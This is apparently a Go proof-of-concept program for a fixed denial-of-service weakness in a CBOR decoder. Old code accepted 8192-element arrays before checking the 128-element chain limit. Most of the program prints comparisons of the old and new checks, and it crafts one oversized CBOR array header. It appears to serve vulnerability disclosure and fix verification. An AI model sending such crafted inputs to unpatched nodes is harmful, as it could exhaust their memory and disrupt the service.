package main

import (
	"bytes"
	"fmt"

	cbg "github.com/whyrusleeping/cbor-gen"
)

func main() {
	fmt.Println("=== PoC for LegacyECChain CBOR DoS ===")
	fmt.Println()
	fmt.Println("ChainMaxLen = 128, but old cbor_gen.go allowed 8192")
	fmt.Println("Attacker can craft CBOR with array of 8192 tipsets, causing large allocation before validation")
	fmt.Println()

	ChainMaxLen := 128
	oldLimit := 8192

	extra := 8192
	fmt.Printf("Testing extra=%d\n", extra)
	if extra > oldLimit {
		fmt.Printf("OLD: would reject (extra > 8192)\n")
	} else {
		fmt.Printf("OLD: would ALLOW allocation of slice with %d elements (DoS!)\n", extra)
	}
	if extra > ChainMaxLen {
		fmt.Printf("NEW: would REJECT (extra > ChainMaxLen=%d) - fixed\n", ChainMaxLen)
	} else {
		fmt.Printf("NEW: would allow\n")
	}

	fmt.Println()
	extra = 129
	fmt.Printf("Testing extra=%d (just over ChainMaxLen)\n", extra)
	if extra > oldLimit {
		fmt.Printf("OLD: would reject\n")
	} else {
		fmt.Printf("OLD: would ALLOW allocation of %d elements (DoS, because validation later rejects but after allocation)\n", extra)
	}
	if extra > ChainMaxLen {
		fmt.Printf("NEW: would REJECT - fixed\n")
	}

	fmt.Println()
	buf := new(bytes.Buffer)
	cw := cbg.NewCborWriter(buf)
	cw.WriteMajorTypeHeader(cbg.MajArray, uint64(8192))
	data := buf.Bytes()
	fmt.Printf("Crafted CBOR header for array of 8192 elements: %x\n", data[:3])

	r := bytes.NewReader(data)
	cr := cbg.NewCborReader(r)
	maj, extra2, err := cr.ReadHeader()
	if err != nil {
		fmt.Printf("ReadHeader error: %v\n", err)
		return
	}
	fmt.Printf("ReadHeader: maj=%d extra=%d\n", maj, extra2)

	if extra2 > 8192 {
		fmt.Printf("OLD check: would reject array too large (%d)\n", extra2)
	} else {
		fmt.Printf("OLD check: would proceed to allocate slice of %d (DoS)\n", extra2)
		fmt.Printf("OLD: allocating slice of %d would consume significant memory\n", extra2)
	}

	if extra2 > uint64(ChainMaxLen) {
		fmt.Printf("NEW check: would reject array too large (%d > %d) - FIXED\n", extra2, ChainMaxLen)
	}

	fmt.Println()
	fmt.Println("=== PoC SUCCESS: Demonstrated DoS via large allocation ===")
	fmt.Println()
	fmt.Println("Marshal side: old allowed marshaling 8192-length chain, new rejects >128")
	fmt.Printf("OLD: len=8192 would be allowed (8192 <= 8192)\n")
	fmt.Printf("NEW: len=8192 would be rejected (8192 > %d)\n", ChainMaxLen)
}
